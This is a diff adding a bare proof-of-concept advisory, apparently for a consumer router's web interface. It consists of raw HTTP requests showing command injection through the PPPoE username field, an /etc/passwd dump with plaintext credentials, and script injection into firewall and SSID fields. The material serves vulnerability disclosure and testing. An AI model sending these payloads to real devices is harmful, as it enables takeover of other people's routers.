@@ -1,0 +1,65 @@
+command-injection vulnerability:
+
+POST /pppoe.cgi HTTP/1.1
+Host: www.example.com
+User-Agent: Mozilla/5.0 (Windows NT 6.1; WOW64; rv:16.0) Gecko/20100101 
+Firefox/16.0
+Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8
+Accept-Language: de-de,de;q=0.8,en-us;q=0.5,en;q=0.3
+Accept-Encoding: gzip, deflate
+Proxy-Connection: keep-alive
+Referer: http://www.example.com/BAS_pppoe.htm
+Cookie: uid=vjkqK779eJ
+Authorization: Basic YWRtaW46cGFzc3dvcmQ=
+Content-Type: application/x-www-form-urlencoded
+Content-Length: 593
+Connection: close
+
+login_type=PPPoE%28PPP+over+Ethernet%29&pppoe_username=%26%20ping%20-c%201%20192%2e168%2e0%2e2%20%26&pppoe_passwd=69cw20hb&pppoe_servicename=&pppoe_dod=1&pppoe_idletime=5&WANAssign=Dynamic&DNSAssign=0&en_nat=1&MACAssign=0&apply=%C3%9Cbernehmen&runtest=yes&wan_ipaddr=0.0.0.0&pppoe_localip=0.0.0.0&wan_dns_sel=0&wan_dns1_pri=0.0.0.0&wan_dns1_sec=...&wan_hwaddr_sel=0&wan_hwaddr_def=84%3A1B%3A5E%3A01%3AE7%3A05&wan_hwaddr2=84%3A1B%3A5E%3A01%3AE7%3A05&wan_hwaddr_pc=5C%3A26%3A0A%3A2B%3AF0%3A3F&wan_nat=1&opendns_parental_ctrl=0&pppoe_flet_sel=&pppoe_flet_type=&pppoe_temp=&opendns_parental_ctrl=0
+
+information-disclosure vulnerability :
+
+~ # cat /etc/passwd
+nobody:*:0:0:nobody:/:/bin/sh
+admin:password:0:0:admin:/:/bin/sh
+guest:guest:0:0:guest:/:/bin/sh
+~ #
+
+HTML-injection vulnerabilities:
+
+POST /fw_serv_add.cgi HTTP/1.1
+Host: www.example.com
+User-Agent: Mozilla/5.0 (Windows NT 6.1; WOW64; rv:16.0) Gecko/20100101 
+Firefox/16.0
+Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8
+Accept-Language: de-de,de;q=0.8,en-us;q=0.5,en;q=0.3
+Accept-Encoding: gzip, deflate
+Proxy-Connection: keep-alive
+Referer: http://www.example.com/fw_serv.cgi
+Cookie: uid=vjkqK779eJ
+Authorization: Basic xxxx=
+Content-Type: application/x-www-form-urlencoded
+Content-Length: 114
+
+userdefined="><img src="0" 
+onerror=alert(1)>&protocol=TCP&portstart=1&portend=5&apply=%C3%9Cbernehmen&which_mode=0
+
+http://www.example.com/fw_serv_add.cgi?userdefined="><img%20src="0"%20onerror=alert(1)>&protocol=TCP&portstart=1&portend=5&apply=%C3%9Cbernehmen&which_mode=0
+
+POST /wlg_sec_profile_main.cgi HTTP/1.1
+Host: www.example.com
+User-Agent: Mozilla/5.0 (Windows NT 6.1; WOW64; rv:16.0) Gecko/20100101 
+Firefox/16.0
+Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8
+Accept-Language: de-de,de;q=0.8,en-us;q=0.5,en;q=0.3
+Accept-Encoding: gzip, deflate
+Proxy-Connection: keep-alive
+Referer: http://www.example.com/WLG_wireless2_2.htm
+Cookie: uid=vjkqK779eJ
+Authorization: Basic xxxx=
+Content-Type: application/x-www-form-urlencoded
+Content-Length: 328
+
+ssidSelect=1&ssid=%2522%253E%253Cscript%253Ealert%25281%2529%253&WRegion=5&w_channel=0&opmode=20n&enable_ap=1&enable_ssid_bc=1&security_type=AUTO-PSK&passphrase=friendlytrain824&Apply=%C3%9Cbernehmen&tempSetting=0&tempRegion=5&initChannel=0&h_opmode=20n&wds_enable=0&ver_type=WW&pfChanged=0&ssid_sel_submit=0&secure_sel_submit=0
+
+
